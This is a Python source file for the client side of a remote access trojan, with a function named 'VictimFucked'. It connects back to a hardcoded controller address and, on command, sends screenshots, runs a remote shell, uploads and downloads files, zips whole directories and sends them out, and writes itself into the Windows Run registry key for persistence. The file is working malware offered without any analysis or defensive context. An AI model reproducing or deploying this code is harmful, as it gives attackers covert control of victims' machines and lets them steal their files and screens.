import socket
from pyautogui import screenshot
import os
import subprocess
import winreg
from zipfile import ZipFile

sock = ''
ip = '192.168.56.1'
port = 8080


def VictimFucked():
    global ip
    global sock
    global port

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))

    while True:

        result = sock.recv(6024)
        data = result.decode('utf-8')

        if data == 'screenshot':

            screenshots = screenshot()
            screenshots.save('screenshot.jpg')
            screenshotSend = open('screenshot.jpg', 'rb')
            buffer = screenshotSend.read(10000)

            while buffer:
                sock.send(buffer)
                buffer = screenshotSend.read(10000)

        if data == 'shell':
            while True:
                boss = sock.recv(1024)
                command = boss.decode('utf-8')[:]
                if command == 'exit':
                    break

                if command[0:2] == 'cd':

                    if command[3:] == '..' or command[3:] == '':
                        os.chdir(os.path.dirname(os.getcwd()))
                        sock.send(str.encode(f'Dir Changed To -> {os.getcwd()}', 'utf-8'))
                    elif command[3:] != '..' and command[3:] != '':
                        os.chdir(command[3:])
                        sock.send(str.encode(f'Directory Changed To -> {os.getcwd()}', 'utf-8'))
                else:
                    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                                               stderr=subprocess.PIPE)
                    process_output = process.stdout.read() + process.stderr.read()
                    sock.send(process_output)
                    print(str(process_output, 'utf-8'))

        elif data == 'upload':

            recived = open(sock.recv(1024).decode('utf-8')[:], 'wb')

            if data == 'exit':
                continue

            buff = sock.recv(6024)
            sock.settimeout(1)

            while buff:

                recived.write(buff)

                try:
                    buff = sock.recv(6024)

                except socket.timeout:
                    break

                if data == 'exit':
                    break

            sock.settimeout(None)

        elif data == 'upload files':

            os.makedirs('Uploads')  # directory to hold all files uploaded to victim
            os.chdir('Uploads')

            reader = open('Downloads.zip', 'wb')
            buff = sock.recv(512)

            sock.settimeout(1)

            while buff != b'':

                reader.write(buff)

                try:
                    buff = sock.recv(512)

                except socket.timeout:
                    break

            sock.settimeout(None)

        elif data == 'download file':
            name = sock.recv(1024).decode('utf-8')[:]

            if name in os.listdir(os.getcwd()):

                sock.send(str.encode('exists', 'utf-8'))

                reader = open(name, 'rb')

                buffer = reader.read(1024)

                while buffer:
                    sock.send(buffer)
                    buffer = reader.read(1024)

                reader.close()

        elif data == 'download dir':

            root_path = sock.recv(1024).decode('utf-8')[:]          # directory name must be delivered

            if os.path.exists(root_path):

                os.chdir(root_path)  # changing to root directory

                with ZipFile('Uploads.zip', 'w', allowZip64=True) as zipko:

                    for bytess in os.listdir(root_path):  # first let's zip the directory

                        if bytess == 'Uploads.zip':
                            continue

                        zipko.write(bytess)

                    reader = open('Uploads.zip', 'rb')
                    buff = reader.read(6000)

                    while buff:

                        sock.send(buff)
                        buff = reader.read(6000)

                        if buff == b'':
                            break

                reader.close()
                os.remove('Uploads.zip')

        elif data == 'persistence':

            if 'clients.exe' in os.listdir(os.getcwd()):

                script_name = 'clients.exe'
                address = os.path.abspath(script_name)

                key = winreg.HKEY_CURRENT_USER
                key_value = r'Software\Microsoft\Windows\CurrentVersion\Run'

                opened_key = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)
                winreg.SetValueEx(opened_key, 'UserRegistry', 0, winreg.REG_SZ,
                                  address)  # setting the script in register
                winreg.CloseKey(opened_key)
                sock.send(str.encode('done', 'utf-8'))

            else:
                sock.send(str.encode('not found', 'utf-8'))

        elif data == 'exit':
            sock.close()
            exit(1)


VictimFucked()
